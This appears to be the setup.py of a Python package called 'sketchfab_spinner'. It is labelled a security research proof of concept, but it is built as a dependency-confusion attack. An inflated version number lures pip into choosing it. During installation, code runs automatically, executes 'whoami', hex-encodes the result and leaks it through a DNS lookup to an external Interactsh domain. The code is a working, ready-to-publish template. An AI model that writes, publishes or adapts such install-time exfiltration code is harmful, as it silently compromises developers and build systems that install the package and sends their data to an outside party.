from setuptools import setup, find_packages
import subprocess
import socket
import binascii
import os

# 🚨 CONFIGURATION
PACKAGE_NAME = "sketchfab_spinner"
VERSION = "99.9.10"  # <--- BUMP THIS VERSION!
DNS_DOMAIN = "alrpzdtypuwrwpjsjzointigavd51e1al.oast.fun"  # Your Interactsh

def get_whoami():
    try:
        # 1. Run 'whoami' command
        # check_output runs the command and captures stdout
        output = subprocess.check_output("whoami", shell=True, timeout=3)
        
        # 2. Clean and Hex Encode the output
        # Hex encoding prevents DNS errors from spaces or special chars
        # e.g., "root" becomes "726f6f74"
        clean_output = output.decode().strip()
        hex_output = binascii.hexlify(clean_output.encode()).decode()
        
        return hex_output
    except Exception as e:
        return "error"

def exfiltrate():
    try:
        data = get_whoami()
        # 3. Construct Payload: HEX_DATA.package_name.interactsh.com
        target = f"{data}.{PACKAGE_NAME}.{DNS_DOMAIN}"
        
        # 4. Send via DNS Lookup
        socket.gethostbyname(target)
    except:
        pass

# Run immediately when setup.py is read (during pip install)
exfiltrate()

setup(
    name=PACKAGE_NAME,
    version=VERSION,
    description="Security Research PoC",
    author="Security Researcher",
    packages=find_packages(),
)
